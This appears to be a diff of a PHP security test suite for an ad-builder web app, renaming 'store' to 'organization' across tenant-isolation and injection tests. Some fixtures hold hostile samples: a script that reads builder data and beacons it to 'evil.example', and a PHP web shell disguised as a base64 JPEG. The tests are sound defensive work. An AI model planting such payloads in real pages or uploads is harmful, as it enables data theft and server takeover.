@@ -4,7 +4,7 @@ use App\Models\BuilderAd;
 use App\Models\BuilderAsset;
 use App\Models\BuilderFont;
 use App\Models\Media;
-use App\Models\Store;
+use App\Models\Organization;
 use App\Services\AdCompiler;
 use Illuminate\Http\UploadedFile;
 use Illuminate\Support\Facades\Storage;
@@ -15,20 +15,20 @@ use Illuminate\Support\Facades\Storage;
 |--------------------------------------------------------------------------
 |
 | The builder is the one place in the app where what a person writes becomes a PAGE — and that page
-| runs on a television in a shop, with scripts in it. So the attacks here are the ones that matter for a
-| page: getting a tag, a script or another shop's file into it; and the ones that matter for a design
-| tool: reaching another store's work by its id, and payloads shaped to make the server fall over.
+| runs on a television in an organization, with scripts in it. So the attacks here are the ones that matter for a
+| page: getting a tag, a script or another organization's file into it; and the ones that matter for a design
+| tool: reaching another organization's work by its id, and payloads shaped to make the server fall over.
 |
 */
 
 beforeEach(function () {
     Storage::fake('public');
 
-    $this->store = Store::factory()->create(['name' => 'Alpha Mart']);
-    $this->other = Store::factory()->create(['name' => 'Beta Deli']);
-    $this->designer = createStoreUser($this->store, ['ad-view', 'ad-store', 'ad-update', 'ad-destroy'], 'Designer');
+    $this->organization = Organization::factory()->create(['name' => 'Alpha Mart']);
+    $this->other = Organization::factory()->create(['name' => 'Beta Deli']);
+    $this->designer = createOrganizationUser($this->organization, ['ad-view', 'ad-store', 'ad-update', 'ad-destroy'], 'Designer');
 
-    $this->actingAs($this->designer)->withSession(['current_store_id' => $this->store->id]);
+    $this->actingAs($this->designer)->withSession(['current_organization_id' => $this->organization->id]);
 });
 
 /** A small, valid document holding the given elements and background layers. */
@@ -41,10 +41,10 @@ function attackDocument(array $elements = [], array $layers = []): array
     return $document;
 }
 
-/* ── The store wall ──────────────────────────────────────────────────── */
+/* ── The organization wall ──────────────────────────────────────────────────── */
 
-test('another store’s ad cannot be changed, copied, published or deleted by its id', function () {
-    $theirs = BuilderAd::factory()->withText('Their sale')->create(['store_id' => $this->other->id, 'name' => 'Theirs']);
+test('another organization’s ad cannot be changed, copied, published or deleted by its id', function () {
+    $theirs = BuilderAd::factory()->withText('Their sale')->create(['organization_id' => $this->other->id, 'name' => 'Theirs']);
     $before = $theirs->document;
 
     $this->putJson("/builder/{$theirs->id}", ['name' => 'Mine now', 'document' => attackDocument()])->assertNotFound();
@@ -59,27 +59,27 @@ test('another store’s ad cannot be changed, copied, published or deleted by it
         ->and(Media::count())->toBe(0);
 });
 
-test('an ad cannot be moved into another store by saying so in the payload', function () {
-    $mine = BuilderAd::factory()->withText()->create(['store_id' => $this->store->id]);
+test('an ad cannot be moved into another organization by saying so in the payload', function () {
+    $mine = BuilderAd::factory()->withText()->create(['organization_id' => $this->organization->id]);
 
     $this->putJson("/builder/{$mine->id}", [
-        'name' => 'Moved?', 'document' => attackDocument(), 'store_id' => $this->other->id, 'media_id' => 1, 'published_at' => now(),
+        'name' => 'Moved?', 'document' => attackDocument(), 'organization_id' => $this->other->id, 'media_id' => 1, 'published_at' => now(),
     ])->assertOk();
 
-    expect($mine->fresh()->store_id)->toBe($this->store->id)
+    expect($mine->fresh()->organization_id)->toBe($this->organization->id)
         ->and($mine->fresh()->media_id)->toBeNull()
         ->and($mine->fresh()->published_at)->toBeNull();
 
-    // A new one lands in the store the person works in, whatever it claims.
-    $id = $this->postJson('/builder', ['name' => 'New', 'document' => attackDocument(), 'store_id' => $this->other->id])
+    // A new one lands in the organization the person works in, whatever it claims.
+    $id = $this->postJson('/builder', ['name' => 'New', 'document' => attackDocument(), 'organization_id' => $this->other->id])
         ->assertOk()->json('ad.id');
 
-    expect(BuilderAd::find($id)->store_id)->toBe($this->store->id);
+    expect(BuilderAd::find($id)->organization_id)->toBe($this->organization->id);
 });
 
-test('another store’s pictures and videos never reach this store’s page — in an element or in the background', function () {
-    $picture = BuilderAsset::factory()->create(['store_id' => $this->other->id, 'path' => 'builder/2/assets/secret-photo.jpg']);
-    $clip = BuilderAsset::factory()->video()->create(['store_id' => $this->other->id, 'path' => 'builder/2/assets/secret-clip.mp4']);
+test('another organization’s pictures and videos never reach this organization’s page — in an element or in the background', function () {
+    $picture = BuilderAsset::factory()->create(['organization_id' => $this->other->id, 'path' => 'builder/2/assets/secret-photo.jpg']);
+    $clip = BuilderAsset::factory()->video()->create(['organization_id' => $this->other->id, 'path' => 'builder/2/assets/secret-clip.mp4']);
 
     $document = attackDocument([
         ['id' => 'a', 'type' => 'image', 'x' => 0, 'y' => 0, 'w' => 100, 'h' => 100, 'z' => 0, 'assetId' => $picture->id],
@@ -97,9 +97,9 @@ test('another store’s pictures and videos never reach this store’s page — 
     expect($html)->not->toContain('secret-photo')->not->toContain('secret-clip');
 });
 
-test('another store’s asset cannot be deleted by its id, and the shelf lists this store’s alone', function () {
-    $theirs = BuilderAsset::factory()->create(['store_id' => $this->other->id, 'title' => 'Their logo']);
-    BuilderAsset::factory()->create(['store_id' => $this->store->id, 'title' => 'Our logo']);
+test('another organization’s asset cannot be deleted by its id, and the shelf lists this organization’s alone', function () {
+    $theirs = BuilderAsset::factory()->create(['organization_id' => $this->other->id, 'title' => 'Their logo']);
+    BuilderAsset::factory()->create(['organization_id' => $this->organization->id, 'title' => 'Our logo']);
 
     $this->deleteJson("/builder/assets/{$theirs->id}")->assertNotFound();
 
@@ -110,49 +110,49 @@ test('another store’s asset cannot be deleted by its id, and the shelf lists t
     expect($titles->all())->toBe(['Our logo']);
 });
 
-test('a shop’s person never makes a file shared, and never deletes a shared one', function () {
-    // Whatever the request says, a store's person's upload is their shop's own.
-    $this->postJson('/builder/assets', ['file' => UploadedFile::fake()->image('logo.png'), 'store_id' => ''])->assertOk();
-    expect(BuilderAsset::sole()->store_id)->toBe($this->store->id);
+test('an organization’s person never makes a file shared, and never deletes a shared one', function () {
+    // Whatever the request says, an organization's person's upload is their organization's own.
+    $this->postJson('/builder/assets', ['file' => UploadedFile::fake()->image('logo.png'), 'organization_id' => ''])->assertOk();
+    expect(BuilderAsset::sole()->organization_id)->toBe($this->organization->id);
 
-    $shared = BuilderAsset::factory()->create(['store_id' => null, 'title' => 'Brand kit', 'path' => 'builder/platform/assets/brand.png']);
+    $shared = BuilderAsset::factory()->create(['organization_id' => null, 'title' => 'Brand kit', 'path' => 'builder/platform/assets/brand.png']);
 
-    // Delete Ads deletes the shop's own; a shared file is the platform's alone to delete (owner, 2026-10-01).
+    // Delete Ads deletes the organization's own; a shared file is the platform's alone to delete (owner, 2026-10-01).
     $this->deleteJson("/builder/assets/{$shared->id}")->assertForbidden();
 
-    // And what the shelf says of a shared file another shop's ad uses names nothing of that shop.
+    // And what the shelf says of a shared file another organization's ad uses names nothing of that organization.
     $document = attackDocument([['id' => 'a', 'type' => 'image', 'x' => 0, 'y' => 0, 'w' => 100, 'h' => 100, 'z' => 0, 'assetId' => $shared->id]]);
-    BuilderAd::factory()->create(['store_id' => $this->other->id, 'name' => 'Beta private launch', 'document' => $document]);
+    BuilderAd::factory()->create(['organization_id' => $this->other->id, 'name' => 'Beta private launch', 'document' => $document]);
 
     expect(json_encode($this->getJson('/builder/assets/data')->assertOk()->json()))->not->toContain('Beta private launch')
         ->and(BuilderAsset::find($shared->id))->not->toBeNull();
 });
 
-test('naming another shop in the listings’ filter finds nothing of it', function () {
-    BuilderAd::factory()->create(['store_id' => $this->other->id, 'name' => 'Their ad']);
-    BuilderAsset::factory()->create(['store_id' => $this->other->id, 'title' => 'Their logo']);
+test('naming another organization in the listings’ filter finds nothing of it', function () {
+    BuilderAd::factory()->create(['organization_id' => $this->other->id, 'name' => 'Their ad']);
+    BuilderAsset::factory()->create(['organization_id' => $this->other->id, 'title' => 'Their logo']);
 
-    expect($this->getJson("/builder/data?store_id={$this->other->id}")->assertOk()->json('ads'))->toBe([])
-        ->and($this->getJson("/builder/assets/data?store_id={$this->other->id}")->assertOk()->json('assets'))->toBe([])
-        ->and($this->getJson('/builder/data?store_id=0')->status())->toBe(422);
+    expect($this->getJson("/builder/data?organization_id={$this->other->id}")->assertOk()->json('ads'))->toBe([])
+        ->and($this->getJson("/builder/assets/data?organization_id={$this->other->id}")->assertOk()->json('assets'))->toBe([])
+        ->and($this->getJson('/builder/data?organization_id=0')->status())->toBe(422);
 });
 
-/* ── The platform's ads for every shop (owner, 2026-10-01) ──────────────── */
+/* ── The platform's ads for every organization (owner, 2026-10-01) ──────────────── */
 
-test('a shop’s person never makes an ad for every shop, whatever the payload says', function () {
-    // Inside a shop a new ad, and a copy, are the shop's own.
-    $id = $this->postJson('/builder', ['name' => 'For everyone?', 'document' => attackDocument(), 'store_id' => null])->assertOk()->json('ad.id');
-    expect(BuilderAd::find($id)->store_id)->toBe($this->store->id);
+test('an organization’s person never makes an ad for every organization, whatever the payload says', function () {
+    // Inside an organization a new ad, and a copy, are the organization's own.
+    $id = $this->postJson('/builder', ['name' => 'For everyone?', 'document' => attackDocument(), 'organization_id' => null])->assertOk()->json('ad.id');
+    expect(BuilderAd::find($id)->organization_id)->toBe($this->organization->id);
 
-    $shared = BuilderAd::factory()->published()->create(['store_id' => null, 'name' => 'Platform sale']);
+    $shared = BuilderAd::factory()->published()->create(['organization_id' => null, 'name' => 'Platform sale']);
     $copyId = $this->postJson("/builder/{$shared->id}/duplicate")->assertOk()->json('ad.id');
 
-    expect(BuilderAd::find($copyId)->store_id)->toBe($this->store->id)
-        ->and(BuilderAd::whereNull('store_id')->count())->toBe(1);
+    expect(BuilderAd::find($copyId)->organization_id)->toBe($this->organization->id)
+        ->and(BuilderAd::whereNull('organization_id')->count())->toBe(1);
 });
 
-test('the platform’s unpublished ad is nothing to a shop: not listed, opened, previewed, copied, changed or deleted', function () {
-    $draft = BuilderAd::factory()->withText('Not yet')->create(['store_id' => null, 'name' => 'Coming soon']);
+test('the platform’s unpublished ad is nothing to an organization: not listed, opened, previewed, copied, changed or deleted', function () {
+    $draft = BuilderAd::factory()->withText('Not yet')->create(['organization_id' => null, 'name' => 'Coming soon']);
 
     expect(json_encode($this->getJson('/builder/data')->assertOk()->json()))->not->toContain('Coming soon');
 
@@ -163,17 +163,17 @@ test('the platform’s unpublished ad is nothing to a shop: not listed, opened, 
     $this->postJson("/builder/{$draft->id}/publish")->assertNotFound();
     $this->deleteJson("/builder/{$draft->id}", ['password' => 'password'])->assertNotFound();
 
-    expect(BuilderAd::where('store_id', $this->store->id)->count())->toBe(0)
+    expect(BuilderAd::where('organization_id', $this->organization->id)->count())->toBe(0)
         ->and($draft->fresh()->name)->toBe('Coming soon');
 });
 
-test('a shop’s copy of the platform’s ad is that shop’s alone', function () {
-    $shared = BuilderAd::factory()->published()->create(['store_id' => null, 'name' => 'Platform sale']);
+test('an organization’s copy of the platform’s ad is that organization’s alone', function () {
+    $shared = BuilderAd::factory()->published()->create(['organization_id' => null, 'name' => 'Platform sale']);
 
-    $this->actingAs(createStoreUser($this->other, ['ad-view', 'ad-store'], 'Beta designer'))->withSession(['current_store_id' => $this->other->id]);
+    $this->actingAs(createOrganizationUser($this->other, ['ad-view', 'ad-store'], 'Beta designer'))->withSession(['current_organization_id' => $this->other->id]);
     $theirs = $this->postJson("/builder/{$shared->id}/duplicate")->assertOk()->json('ad.id');
 
-    $this->actingAs($this->designer)->withSession(['current_store_id' => $this->store->id]);
+    $this->actingAs($this->designer)->withSession(['current_organization_id' => $this->organization->id]);
     $this->get("/builder/{$theirs}")->assertNotFound();
     $this->postJson("/builder/{$theirs}/duplicate")->assertNotFound();
 
@@ -187,7 +187,7 @@ test('the draft preview runs sandboxed, so whatever it carried could reach nothi
         'id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 400, 'h' => 100, 'z' => 0,
         'text' => '<script>fetch("/builder/data").then(r => r.text()).then(t => navigator.sendBeacon("https://evil.example", t))</script>',
     ]]);
-    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'document' => $document]);
+    $ad = BuilderAd::factory()->create(['organization_id' => $this->organization->id, 'document' => $document]);
 
     $response = $this->get("/builder/{$ad->id}/preview")->assertOk();
 
@@ -198,7 +198,7 @@ test('the draft preview runs sandboxed, so whatever it carried could reach nothi
 });
 
 test('a poster that is not a picture is never written, whatever label it wears', function () {
-    $mine = BuilderAd::factory()->withText()->create(['store_id' => $this->store->id]);
+    $mine = BuilderAd::factory()->withText()->create(['organization_id' => $this->organization->id]);
 
     foreach ([
         'data:image/jpeg;base64,'.base64_encode('<?php echo shell_exec($_GET["c"]); ?>'),
@@ -229,7 +229,7 @@ test('the animations cannot close their script tag, whatever the ids, effects an
     ]]);
 
     // Straight into the database — past the save rules, as a row written some other way would be.
-    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'document' => $document]);
+    $ad = BuilderAd::factory()->create(['organization_id' => $this->organization->id, 'document' => $document]);
     $this->postJson("/builder/{$ad->id}/publish")->assertOk();
 
     $html = Storage::disk('public')->get(Media::sole()->path);
@@ -300,7 +300,7 @@ test('a colour, a gradient or a font name cannot carry a second declaration into
         ['id' => 'l', 'type' => 'color', 'color' => $escape, 'opacity' => $escape, 'blend' => $escape],
     ]);
 
-    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'document' => $document]);
+    $ad = BuilderAd::factory()->create(['organization_id' => $this->organization->id, 'document' => $document]);
     $this->postJson("/builder/{$ad->id}/publish")->assertOk();
 
     $html = Storage::disk('public')->get(Media::sole()->path);
@@ -311,14 +311,14 @@ test('a colour, a gradient or a font name cannot carry a second declaration into
 test('a font’s stylesheet can bring nothing but its own family’s files into a page', function () {
     // The fonts travel inside the page. A stylesheet pointing at any other file on the disk gets nothing
     // in: only a file the family's own row lists is ever read, whatever the stylesheet says.
-    Storage::disk('public')->put('media/2/private.woff2', 'another-shops-bytes');
+    Storage::disk('public')->put('media/2/private.woff2', 'another-organizations-bytes');
     Storage::disk('public')->put('fonts/anton/font.css', "@font-face{font-family:'Anton';font-style:normal;font-weight:400;src:url('http://localhost/storage/media/2/private.woff2') format('woff2');}");
     BuilderFont::create([
         'family' => 'Anton', 'slug' => 'anton', 'kind' => 'display', 'weights' => [400],
         'files' => ['fonts/anton/400-normal-0.woff2'], 'css_path' => 'fonts/anton/font.css', 'size' => 1,
     ]);
 
-    $ad = BuilderAd::factory()->create(['store_id' => $this->store->id, 'document' => attackDocument([[
+    $ad = BuilderAd::factory()->create(['organization_id' => $this->organization->id, 'document' => attackDocument([[
         'id' => 'a', 'type' => 'text', 'x' => 0, 'y' => 0, 'w' => 900, 'h' => 200, 'z' => 0,
         'text' => 'Sale', 'style' => ['fontFamily' => 'Anton'], 'animations' => [],
     ]])]);
@@ -326,7 +326,7 @@ test('a font’s stylesheet can bring nothing but its own family’s files into 
 
     $html = Storage::disk('public')->get(Media::sole()->path);
 
-    expect($html)->not->toContain('@font-face')->not->toContain(base64_encode('another-shops-bytes'));
+    expect($html)->not->toContain('@font-face')->not->toContain(base64_encode('another-organizations-bytes'));
 });
 
 /* ── Payloads shaped to make it fall over ────────────────────────────── */
@@ -399,8 +399,8 @@ test('a document of the wrong shape is refused with a 422, never a 500', functio
 /* ── The orientation is fixed ────────────────────────────────────────── */
 
 test('a saved ad’s orientation cannot be changed by any payload — the design is measured against the column', function () {
-    $landscape = BuilderAd::factory()->withText()->create(['store_id' => $this->store->id]);
-    $portrait = BuilderAd::factory()->portrait()->withText()->create(['store_id' => $this->store->id]);
+    $landscape = BuilderAd::factory()->withText()->create(['organization_id' => $this->organization->id]);
+    $portrait = BuilderAd::factory()->portrait()->withText()->create(['organization_id' => $this->organization->id]);
 
     // Saying it, with a design of the other shape: refused on the stage's size.
     $this->putJson("/builder/{$landscape->id}", ['name' => 'Turned', 'orientation' => 'portrait', 'document' => BuilderAd::blankDocument('portrait')])
